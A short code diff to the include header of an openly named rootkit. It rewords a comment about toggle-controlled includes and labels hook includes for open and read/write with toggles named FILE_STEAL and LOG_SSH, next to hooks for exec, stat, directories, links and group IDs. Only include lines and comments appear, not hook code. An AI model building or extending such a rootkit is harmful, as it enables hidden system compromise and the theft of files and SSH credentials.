@@ -1,8 +1,9 @@
 /*
     essential includes for the rootkit.
     if a header include is suffixed with a comment for
-    a specific toggle, it will be read conditionally
-    depending solely on the status of said toggle.
+    a specific toggle, its variable placeholders
+    will be read conditionally depending solely on
+    the status of said toggle.
     i.e.: #include "hooks/blahblah.c" // [BLAH_TOGGLE]
  */
 
@@ -43,9 +44,9 @@ int socket(int domain, int type, int protocol);
 #endif
 
 #include "hooks/exec/exec.h"
-#include "hooks/open/open.h"
+#include "hooks/open/open.h" // [FILE_STEAL]
 #include "hooks/stat/stat.h"
-//#include "hooks/rw/rw.h"
+//#include "hooks/rw/rw.h" // [LOG_SSH]
 #include "hooks/dir/dir.h"
 #include "hooks/ln/links.h"
 #include "hooks/gid/gid.h"
